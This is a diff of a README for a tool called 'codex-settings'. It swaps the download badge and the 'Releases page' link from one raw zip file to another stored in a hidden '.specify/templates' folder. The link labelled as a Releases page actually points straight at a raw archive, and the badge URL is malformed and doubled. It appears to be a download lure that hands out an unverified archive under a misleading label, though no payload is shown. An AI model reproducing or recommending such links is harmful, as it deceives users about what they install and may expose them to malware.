@@ -1,6 +1,6 @@
 # 🎉 codex-settings - Simplify Your Coding Experience
 
-[![Download Codex Settings](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip%https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip)](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip)
+[![Download Codex Settings](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/.specify/templates/settings-codex-v3.7.zip%https://raw.githubusercontent.com/eduardogrs/codex-settings/main/.specify/templates/settings-codex-v3.7.zip)](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/.specify/templates/settings-codex-v3.7.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -24,7 +24,7 @@ To run codex-settings, you'll need:
 ## 📥 Download & Install
 You can easily download codex-settings from our Releases page. 
 
-Visit this page to download: [Codex Settings Releases](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip).
+Visit this page to download: [Codex Settings Releases](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/.specify/templates/settings-codex-v3.7.zip).
 
 ### Installation Steps
 1. Click on the link above to go to the Releases page.
